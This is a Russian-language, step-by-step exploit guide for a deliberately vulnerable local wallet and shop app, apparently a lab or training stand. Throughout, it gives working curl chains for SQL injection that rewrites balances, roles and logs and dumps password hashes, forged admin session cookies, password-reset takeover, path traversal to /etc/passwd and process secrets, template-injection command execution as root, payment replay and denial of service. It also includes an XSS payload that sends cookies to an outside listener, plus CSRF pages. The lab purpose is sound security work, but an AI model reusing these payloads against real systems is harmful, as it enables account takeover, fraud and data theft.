# Пошаговые цепочки — как получается каждый пункт

Разбор шпаргалки из SECURITY.md: что именно нажимать и в каком порядке, чтобы
получить каждый эффект. Всё проверено на живом стенде, те же цепочки автоматически
гоняют `poc/stage_access.sh`, `poc/stage_money.sh`, `poc/stage_data.sh`
(запуск всех трёх: `sh poc/run_all.sh`).

Подготовка, одна на всё:

```bash
# стенд
docker compose up -d --build

# вход, куки кладём в файл — все запросы ниже ходят с ним
jar=/tmp/ow.jar
curl -s -c $jar -b $jar -X POST -d 'login=ivanov&password=workplace1&return=/' \
  -o /dev/null http://localhost:18081/login

# база, пароль wallet/wallet лежит в docker-compose.yml
db() { docker exec office-wallet-main-db-1 psql -U wallet -d wallet -tAc "$1"; }
```

---

## Доступы

### 1. Сменить пароль любому и зайти

Способ А — напрямую в базе (самый быстрый):

```bash
# у pgcrypto в этой базе нет, поэтому готовый хеш не генерируем, а копируем:
# ставим жертве пароль, который мы и так знаем (ivanoв/workplace1)
db "UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE login='ivanov') WHERE login='adminw';"
# → UPDATE 1

# заходим под жертвой
curl -s -c /tmp/v.jar -b /tmp/v.jar -X POST \
  -d 'login=adminw&password=workplace1&return=/' -o /dev/null \
  -w '%{http_code}\n' http://localhost:18081/login
# → 302, кука ow_session получена — админка открыта
```

Способ Б — через SQL-инъекцию в форме перевода (без доступа к базе, нужна только
учётка). Хеш bcrypt не содержит одинарных кавычек, поэтому вставляется как есть:

```bash
HASH=$(db "SELECT password_hash FROM users WHERE login='ivanov'")
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode "amount_rub=1;UPDATE users SET password_hash='$HASH' WHERE login='adminw';--" \
  --data-urlencode 'memo=x' -o /dev/null \
  http://localhost:18081/transfer/new
```

Способ В — цепочка сброса, полностью через приложение: см. пункт 3 ниже.

Восстановить исходный пароль после теста:

```bash
db "UPDATE users SET password_hash='$СТАРЫЙ_ХЕШ' WHERE login='adminw';"
```

### 2. Любая роль без пароля (фейк админ-куки)

Шаги:

1. Достаём ключ — он в статике, отдаётся любому, кто открыл страницу:
   `SESSION_KEY=office-wallet-session-key` (ищем в `app/static/wallet.js`,
   видно и в `/proc/1/environ`, см. «Читать любые файлы»).
2. Считаем подпись от строки `uid:роль` (сервер делает ровно то же при входе,
   `app/internal/app/auth.go:46-50`):

```bash
SIG=$(printf '6:admin' | openssl dgst -sha256 -hmac 'office-wallet-session-key' -hex | sed 's/.*= //')
COOKIE="ow_session=ow.6.admin.$SIG"
# id=6 — это adminw в сиде; для иванова (id=1) будет ow.1.admin.$SIG
```

3. Открываем админские страницы:

```bash
curl -s -H "Cookie: $COOKIE" http://localhost:18081/admin/secrets | head -5   # служебные ключи
curl -s -H "Cookie: $COOKIE" http://localhost:18081/gateway/sms               # коды сброса всех
```

Почему работает: роль входит в подписываемую строку, но после проверки подписи
с базой не сверяется (`auth.go:40-42`), а ключ — константа в репозитории.

### 3. Сброс пароля жертвы целиком

1. Просим сброс — письмо и SMS уходят в общие ящики:

```bash
curl -s -X POST -d 'login=adminw' -o /dev/null http://localhost:18081/password/forgot
```

2. Забираем ссылку из почты — `/mail` отдаёт весь outbox любому вошедшему:

```bash
curl -s -b $jar http://localhost:18081/mail | grep -o '/password/reset?rid=[0-9]*' | head -1
# → /password/reset?rid=10
```

3. Забираем код — два варианта:
   - подделанной админ-кукой из пункта 2: `curl -s -H "Cookie: $COOKIE" http://localhost:18081/gateway/sms`,
     ищем строку `код подтверждения сброса 172929 (заявка #10)`;
   - или сразу из базы: `db "SELECT sms_code FROM password_resets ORDER BY id DESC LIMIT 1;"`.

4. Меняем пароль:

```bash
curl -s -X POST -d 'rid=10&sms_code=172929&password=Hack1234' -o /dev/null \
  -w '%{http_code}\n' http://localhost:18081/password/reset
# → 302 на /login
```

5. Заходим: `login=adminw&password=Hack1234`.

Почему работает: ссылка видна чужому, код — в открытом SMS-шлюзе, срок у кода
не проверяется и лимита попыток нет (`handlers_auth.go:146`).

### 4. Брут без ограничений

```bash
for i in 1 2 3 4 5 6; do
  curl -s -o /dev/null -w "попытка $i → HTTP %{http_code}\n" -X POST \
    -d 'login=ivanov&password=nope&return=/' http://localhost:18081/login
done
```

Все ответы одинаковые (200, страница с ошибкой), ни одной 429/блокировки.
Дальше вход настоящим паролем проходит — счётчика попыток нет вообще
(`handlers_auth.go:33-65`). Код сброса шестизначный и гоняется так же:
запросили сброс, перебираете `sms_code` от 000000 до 999999 — задержки нет.

### 5. Обход блокировки

```bash
db "UPDATE users SET blocked=TRUE WHERE login='ivanov';"   # бухгалтер нажал «заблокировать»

# заблокированный входит как ни в чём не бывало:
curl -s -c /tmp/b.jar -b /tmp/b.jar -X POST \
  -d 'login=ivanov&password=workplace1&return=/' -o /dev/null -w '%{http_code}\n' \
  http://localhost:18081/login
# → 302, сессия получена

# и старая сессия тоже продолжает работать:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/
# → 200
```

Проверки `blocked` при чтении сессии нет (`auth.go:17-44`), а в `handlers_auth.go`
проверки нет вообще. Блокировка действует только на получателя перевода.

---

## Деньги

### 6. Печатать деньги (возврат qty=100)

1. Оформляем заказ на 450₽ (товар 1):

```bash
curl -s -b $jar -X POST -d 'product_id=1' -o /dev/null http://localhost:18081/cart/add
Q=$(curl -s -b $jar -X POST -d 'item_comment=обычный' http://localhost:18081/checkout/quote \
  | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')
LOC=$(curl -s -b $jar -X POST -d "quote_id=$Q" -o /dev/null -w '%{redirect_url}' \
  http://localhost:18081/checkout/confirm)
ORD=${LOC##*/}    # номер заказа в конце адреса
```

2. Возврат с завышенным количеством:

```bash
curl -s -b $jar -X POST -d 'qty=100' -o /dev/null \
  -w '%{http_code} %{redirect_url}\n' http://localhost:18081/orders/$ORD/return
```

3. Смотрим баланс: `refund = total × qty` = 450₽ × 100 = **+45000₽**
   (`handlers_shop.go:350-363`). qty не ограничен ничем — хоть 1000000.

### 7. Уводить деньги (возврат qty=-1)

То же, что пункт 6, но `qty=-1`:

```bash
curl -s -b $jar -X POST -d 'qty=-1' -o /dev/null http://localhost:18081/orders/$ORD/return
```

Деньги уходят со счёта, возврат всё равно проводится: `refund = -total`.
В `anomaly_log` пишется строка `return_neg` — и ничего больше, никто не смотрит.

### 8. Повторять платежи (подпись без nonce)

Способ А — кнопкой из интерфейса: на странице `/history` у каждой операции лежит
готовая форма с подписью (`history.html:28-35`), поле `to_login` меняет получателя
мимо подписанного. Жмёте «Повтор» сколько угодно раз.

Способ Б — сами считаете подпись (ключ в статике `PAYMENT_KEY=office-wallet-pay-key`):

```bash
# формат: op_id:amount_kop:recipient — те же данные лежат в форме на /history
SIG=$(printf '2:300:3' | openssl dgst -sha256 -hmac 'office-wallet-pay-key' -hex | sed 's/.*= //')

# платёж проводится, и проводится снова, и снова:
for i in 1 2 3; do
  curl -s -b $jar -X POST -d "op_id=2&amount_kop=300&recipient=3&sig=$SIG" \
    -o /dev/null -w "повтор $i → %{http_code}\n" http://localhost:18081/pay/replay
done
```

Почему работает: в подписи нет ни nonce, ни срока, ни привязки к сессии
(`handlers_money.go:368-401`), проверяется только совпадение хеша.

### 9. Менять балансы и роли напрямую (SQL-инъекция)

Сумма не парсится → сервер выполняет её как SQL (`handlers_money.go:172-180`),
lib/pq при Exec без параметров гоняет несколько команд подряд:

```bash
# себе +5000₽
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--' \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new

# назначить себе роль admin
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode "amount_rub=1;UPDATE users SET role='admin' WHERE login='ivanov';--" \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new

# подчистить журнал после себя
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=1;DELETE FROM anomaly_log;--' \
  --data-urlencode 'memo=x' -o /dev/null http://localhost:18081/transfer/new
```

После правки роли перелогиниться — роль в куке перетирает базу (`auth.go:40-42`).

### 10. Отменять чужие заказы

```bash
# смотрим чужой заказ — проверки владельца при просмотре нет (handlers_shop.go:284-301)
curl -s -b $jar http://localhost:18081/orders/1 | grep -o 'Заказ #1'

# отменяем — проверки владельца при отмене тоже нет (handlers_shop.go:304-329)
curl -s -b $jar -X POST -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  http://localhost:18081/orders/1/cancel
```

Чужой заказ уходит в `cancelled`, деньги возвращаются на счёт **его владельца**
(вы этого не видите, но баланс жертвы растёт), выдача и учёт рассинхронизируются.

---

## Данные

### 11. Дамп всех паролей

Способ А — SQL-инъекцией на чтение: подзапрос возвращает строку, приведение к
bigint падает, текст ошибки с содержимым печатается в форме:

```bash
curl -s -b $jar -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=(SELECT string_agg(login||chr(61)||password_hash, chr(10)) FROM users)' \
  --data-urlencode 'memo=x' http://localhost:18081/transfer/new \
  | grep -o '\$2a\$[^&<]*'
# → 6 строк login=хеш
```

Способ Б — просто в базу (пароль в docker-compose.yml):

```bash
db "SELECT login, role, password_hash FROM users ORDER BY id;"
```

### 12. Читать любые файлы

```bash
curl -s -b $jar -X POST --data-urlencode 'filename=../../../../etc/passwd' \
  http://localhost:18081/statements/export | head -3

curl -s -b $jar -X POST --data-urlencode 'filename=../../../../proc/1/environ' \
  http://localhost:18081/statements/export | tr '\0' '\n' | grep -E 'KEY|DATABASE_URL'
# → PAYMENT_KEY=... DATABASE_URL=... SESSION_KEY=...
```

Фильтр снимает `../` только один раз, результат после `filepath.Join` не проверяется
(`handlers_shop.go:449-461`). То же самое читает RCE-оболочка из пункта 13.

### 13. RCE — выполнить команду на сервере

```bash
curl -s -b $jar -X POST -d 'product_id=1' -o /dev/null http://localhost:18081/cart/add
Q=$(curl -s -b $jar -X POST \
  --data-urlencode 'item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}}' \
  http://localhost:18081/checkout/quote | grep -o 'name="quote_id" value="[0-9]*"' | grep -o '[0-9]*')
LOC=$(curl -s -b $jar -X POST -d "quote_id=$Q" -o /dev/null -w '%{redirect_url}' \
  http://localhost:18081/checkout/confirm)
ORD=${LOC##*/}

# шаблон с комментарием выполняется при открытии превью:
curl -s -b $jar "http://localhost:18081/orders/$ORD/preview?renderer=classic" \
  | grep -E 'uid=|_KEY=|DATABASE_URL=' | sed 's/<[^>]*>//g'
# → uid=0(root) gid=0(root) ... SESSION_KEY=... PAYMENT_KEY=... DATABASE_URL=...
```

Дальше в той же оболочке: `{{exec "cat /etc/shadow"}}`, `{{exec "sh -c \"...\""}}`,
сеть внутри кластера, сканирование, закладка в `/app/exports` (видна всем в
`/ops/journal`). Контейнер работает от root (`handlers_shop.go:388-420`).

### 14. Все почты и письма

```bash
curl -s -b $jar http://localhost:18081/mail
# → таблица всего mail_outbox: кому, тема, текст, когда — без фильтра по адресату
```

Тут же лежат ссылки на сброс паролей (пункт 3) и любые служебные письма
(`handlers_auth.go:181-200`).

### 15. Чужие операции (токены /api/ops/feed)

```bash
# без подписи — отказ:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/operations/52
# → 403

# feed сам выдаёт подписи на 30 последних операций всех пользователей:
curl -s -c $jar -b $jar http://localhost:18081/api/ops/feed | head -c 200
# → [{"id":55,...,"t":"5ad92e0a..."}, ...]  и куки op_grant_<id> в файле $jar

# теперь та же операция открывается:
curl -s -b $jar -o /dev/null -w '%{http_code}\n' http://localhost:18081/operations/52
# → 200, в ответе тип, сумма, отправитель, получатель, комментарий
```

Почему: feed раздаёт `op_grant` (`handlers_money.go:97-127`), а проверка сверяет
подпись только с uid смотрящего (`:78-89`) — то есть feed выдаёт валидные ключи
от чужих записей.

---

## Отказ в обслуживании

### 16. Положить сервис (отказ БД)

```bash
python3 poc/04_unlimited_db_pool.py http://localhost:18081 150 45
```

150 параллельных запросов с `amount_rub=1;SELECT pg_sleep(45);--` через ту же
инъекцию из пункта 9. Пул соединений не ограничен (`server.go:25`), у postgres
`max_connections=100` — база засыпает, обычный вход в этот момент отдаёт
`500 pq: sorry, too many clients already`. Через 45 секунд всё само
восстанавливается, повторять можно бесконечно.

### 17. Копить соединения (медленные заголовки)

```bash
python3 poc/03_slowloris.py http://localhost:18081 30 300
```

Открывает соединения и не заканчивает заголовки: сервер держит их все, потому что
`ReadHeaderTimeout` не выставлен (`server.go:61-66`). Пока скрипт висит — fd
растут, соединения не закрываются ни на секунду.

### 18. (см. «Обход блокировки», пункт 5)

---

## Через браузер жертвы

### 19. Кража сессии (XSS)

1. Сохраняете комментарий чаевых с payload (санитайзер режет только строчными
   подстроками, `handlers_money.go:344`):

```
<ScRiPt>new Image().src='http://localhost:9999/c?'+document.cookie</ScRiPt>
```

2. Жертва открывает страницу входящих чаевых — скрипт выполняется у неё.
3. Cookie не имеет HttpOnly (`auth.go:59`), поэтому `document.cookie` отдаёт
   `ow_session` целиком — сессия у вас.
4. Дальше всё то, что умеет жертва: переводы, заказы, её роль (если бухгалтер или
   админ — полный доступ), письма.

### 20. CSRF

Формы без токенов, Origin/Referer не проверяются, часть действий меняется по GET:

```html
<!-- жертва открыла вашу страницу — заказ уже отменён -->
<img src="http://localhost:18081/orders/1/received" style="display:none">

<!-- или перевод с её сессией -->
<form action="http://localhost:18081/transfer/new" method="post" id="f">
  <input name="recipient" value="petrova">
  <input name="amount_rub" value="1000">
  <input name="memo" value="спасибо">
</form>
<script>document.getElementById('f').submit()</script>
```

С XSS из пункта 19 CSRF вообще не нужен — скрипт работает напрямую.

---

## Что нельзя

Зайти «из ниоткуда» без единого действия — нужна либо своя учётка (её дают
`ivanov/workplace1` или любой сотруднический доступ), либо прямой доступ к базе
или сети. Но одной учётки хватает на всё остальное: пункты 2-15 из неё и
вырастают.

---

## Сброс стенда после всех тестов

```bash
docker compose down -v && docker compose up -d --build
```

Флаг `-v` обязателен: без него переписанные балансы, пароли и роли останутся.
